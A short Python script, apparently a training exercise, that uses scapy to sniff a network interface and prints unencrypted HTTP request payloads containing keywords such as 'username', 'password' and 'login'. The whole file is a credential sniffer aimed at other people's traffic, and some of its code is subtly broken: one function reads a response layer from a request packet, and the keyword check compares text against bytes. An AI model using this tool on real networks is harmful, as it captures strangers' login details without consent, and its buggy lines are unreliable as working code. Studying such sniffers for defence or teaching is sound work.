#/usr/bin/env python
from scapy.all import sniff, Raw
from scapy.layers import http

keywords =["username", "password", "login", "email", "pass", "log"]

def sniff_interface(interface):
    # sniff(er) Arguments:
    # store=False: tells scapy not to store the packets in memory.
    # prn=[CALL_BACK_FUNCTION]:
    # filter="": tcp, udp, port #, arp,
    # We want to filter http packets, so for this we need a third party module
    sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_http(packet):
    # Does not work because of https
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPResponse].Path
        print(url)
    else:
        print("Packet has no http.HTTPRequest")

def process_sniffed_packet(packet):
    # For http only (which barely exists but good as a training exercise.
    # If our packet has a http layer
    if packet.haslayer(http.HTTPRequest):
        # if our packet http has a Raw layer
        if packet.haslayer(Raw):
            # Print the load details, which should contain the UN and PW
            load = packet[Raw].load
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break

